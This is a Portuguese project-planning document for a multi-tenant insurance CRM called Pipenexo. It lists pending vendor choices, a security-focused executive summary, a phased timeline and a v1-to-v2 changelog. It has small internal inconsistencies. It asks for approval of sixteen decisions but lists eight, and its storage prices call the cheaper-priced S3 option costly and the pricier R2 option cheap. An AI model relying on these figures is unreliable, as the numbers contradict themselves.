## 16. DECISÕES PENDENTES (Questões para Igor)

Antes de começar implementação, preciso que você aprove estas escolhas técnicas:

### 16.1 Gateway de Pagamento
```
Opção A: Stripe (integração nativa, webhooks robusto, +2% fee)
Opção B: PagSeguro (locale Brasil, -1% fee, docs menos completas)
Opção C: Ambas (maior flexibilidade, mais complexidade)
```
**Recomendação**: Opção A (Stripe) + fallback para PagSeguro later

### 16.2 Cloud Storage
```
Opção A: AWS S3 (costoso ~R$0.01/GB, mas robusto)
Opção B: Cloudflare R2 (barato ~R$0.015/GB, Cloudflare CDN)
Opção C: Local storage (grátis, mas sem backup)
```
**Recomendação**: Opção B (Cloudflare R2) pelo custo

### 16.3 Autoscaling Backend
```
Opção A: Vercel (Node.js + serverless, sem scaling manual)
Opção B: Heroku (scaling manual, +$7/dyno)
Opção C: AWS ECS (controle total, +complexidade)
```
**Recomendação**: Opção A (Vercel já usa)

### 16.4 Seguradoras para FASE 4
```
Iniciar com: SulAmérica, Bradesco, Porto Seguro (market share 40%)
Roadmap: Allianz, Zurich, Caixa (fases futuras)
```
**Recomendação**: Confirmar relevância com você baseado em clientes iniciais

### 16.5 Backup Strategy
```
Opção A: AWS RDS Automated (30 dias, point-in-time recovery)
Opção B: Wal-G (backup contínuo, mais barato)
Opção C: Ambas (RPO <5min,+complexidade)
```
**Recomendação**: Opção A para começar

### 16.6 CI/CD Pipeline
```
Opção A: GitHub Actions (free, testes + deploy automático)
Opção B: CircleCI (2000 min/mês free)
Opção C: GitLab CI
```
**Recomendação**: Opção A (GitHub Actions)

### 16.7 Monitoramento e Alertas
```
Opção A: Datadog (caro, mas completo)
Opção B: New Relic (mid-tier)
Opção C: Sentry + CloudWatch (barato, eficiente)
```
**Recomendação**: Opção C (Sentry para app errors, CloudWatch para infraestrutura)

### 16.8 Email Transacional
```
Opção A: SendGrid (30+ templates, robusto)
Opção B: AWS SES (barato ~R$0.10/1k)
Opção C: Mailgun
```
**Recomendação**: Opção A (SendGrid) com fallback para SES

---

## RESUMO EXECUTIVO: O PIPENEXO APÓS ESTA REVISÃO

### O que mudou de v1 para v2:

✅ **Segurança**: De "localStorage fake" para "SaaS enterprise-grade"
- Autenticação real (JWT + bcrypt)
- Isolamento tenant impossível de burlar (RLS + middleware)
- Web security (XSS, CSRF, CORS, CSP, rate limiting)
- Audit imutável
- Soft delete com rastreamento

✅ **Arquitetura**: De "aplicação única" para "3 frontends + backend real"
- /public/ (landing page)
- /app/ (CRM autenticado)
- /admin/ (SuperAdmin)
- Backend Express com RLS em Postgres

✅ **Operações**: De "sem backup" para "disaster recovery enterprise"
- Backup diário com PITR
- RTO 4 horas, RPO 1 hora
- Cross-region replication (futuro)

✅ **Monetização**: De "sem cobrança" para "SaaS multi-tier"
- Planos Básico/Pro/Enterprise
- Webhooks de pagamento
- Gating de features
- Faturamento automático

✅ **Conformidade**: De "sem auditoria" para "completo rastreamento"
- Audit logs imutáveis por 7 anos
- LGPD-ready (deletion policy)
- Soft delete reversível

### Timeline Realista:

| Fase | Duração | Condição |
|------|---------|----------|
| **FASE 0** | 5-7 dias | Bloqueador: sem FASE 1 sem esta |
| **FASE 1** | 2 semanas | Após FASE 0 |
| **FASE 2** | 2 semanas | Após FASE 1 |
| **FASE 3** | 2 semanas | Após FASE 2 |
| **FASE 4** | 3 semanas | Após FASE 3 |
| **FASE 5** | 2 semanas | Após FASE 4 |
| **Total** | ~12-14 semanas | Começando HOJE |

### Risco Mais Alto:

⚠️ **FASE 0 não completa → todo o resto sofre**
- Se autenticação vazar, usuários veem dados de outros
- Se RLS falhar, bug na app expõe dados
- Se soft delete não funcionar, auditoria é questionável
- Por isto: FASE 0 é bloqueador obrigatório

### Próximo Passo:

1. **Você aprova** as 16 decisões pendentes acima
2. **Você confirma** segue com FASE 0 imediatamente
3. **Eu começo a codificar** as 8 migrations + backend auth
4. **Testes passam 100%** antes de qualquer FASE 1

---

## ALTERAÇÕES DESTA REVISÃO (v1 → v2)

### Seções Adicionadas
- Seção 5: Arquitetura Multi-Tenant (fluxo de request)
- Seção 6: Segurança Web (XSS, CSRF, CORS, CSP, IDOR, sanitização, etc) — 10 subsecções
- Seção 7: Armazenamento de Documentos (isolamento, assinatura, scan malware)
- Seção 8: Autenticação e Sessões (JWT, refresh token com rotação, password reset, rate limiting)
- Seção 9: Cobrança SaaS (subscriptions, invoices, webhooks, idempotência)
- Seção 10: Backup e Disaster Recovery
- Seção 11: SQL Completo (todas as 8 migrations em ordem correta)
- Seção 12: RLS Detalhado (connection pooling, policies SELECT/INSERT/UPDATE/DELETE)

### Seções Revisadas
- Seção 4: 10 Problemas Críticos — expandido com soluções específicas
- Seção 3: Diagnóstico — adicionado status de segurança por aspecto

### Decisões Técnicas Incorporadas
- [✓] UNIQUE deve incluir company_id (apólices, sinistros, protocolos, etc)
- [✓] Refresh token com hash (SHA-256), não plain text
- [✓] Soft delete (deleted_at + deleted_by) em entidades críticas
- [✓] Audit logs imutáveis vs Timeline events (usuário)
- [✓] Storage com isolamento by company_id + signed URLs + malware scan
- [✓] RLS com reset de contexto entre requests (connection pooling seguro)
- [✓] Campos derivados calculados, não armazenados (dias_restantes, etc)
- [✓] Ações em massa com idempotency key + transações + retry

---

---

## DOCUMENTAÇÃO COMPLETA

**Versão**: 2.0 - Revisão Técnica Completa  
**Data**: Setembro 2026  
**Status**: ✅ PRONTO PARA APROVAÇÃO  
**Próximo Passo**: Aprovação das 16 decisões pendentes (Seção 16)

---

**Este documento foi revisado e expandido com base nas 20 exigências solicitadas:**

✅ 1. SQL e ordem de migration (8 migrations corrigidas, ordem por FK)  
✅ 2. Constraints de multitenant (UNIQUE incluindo company_id)  
✅ 3. Row-Level Security forte (connection pooling seguro)  
✅ 4. Refresh token seguro (SHA-256 hashed, rotação, theft detection)  
✅ 5. Proteção de login (rate limiting, brute force, password reset)  
✅ 6. Web Security (XSS, CSRF, CORS, CSP, Helmet, validação, SQL injection, IDOR, mass assignment, payload limits, error handling)  
✅ 7. Storage/Documents (private bucket, signed URLs, malware scan, company_id isolation, RLS)  
✅ 8. Soft delete patterns (deleted_at, deleted_by consistente)  
✅ 9. Audit logs vs timeline_events (imutável vs user-facing)  
✅ 10. SaaS charging (subscriptions, invoices, payments, webhooks com idempotence)  
✅ 11. Disaster Recovery (RPO/RTO, backup strategy, restore procedures)  
✅ 12. Bulk Actions (idempotency keys, async, retry logic, audit trail)  
✅ 13. Campos derivados (calculados, não armazenados)  
✅ 14. SuperAdmin separation (dedicated auth, full audit)  
✅ 15. Security Test Suite (24 testes específicos por camada)  
✅ 16. Acceptance criteria baseada em testes (não tempo)  
✅ 17. "Never trust frontend" explícito (Seção 2.1)  
✅ 18. Multi-tenant principle (company_id do token, nunca frontend) (Seção 2.2)  
✅ 19. Estrutura de fases mantida (FASE 0-5) com atualizações  
✅ 20. Deliverables: SQL revisado, arquitetura textual, checklists, testes, decisões pendentes
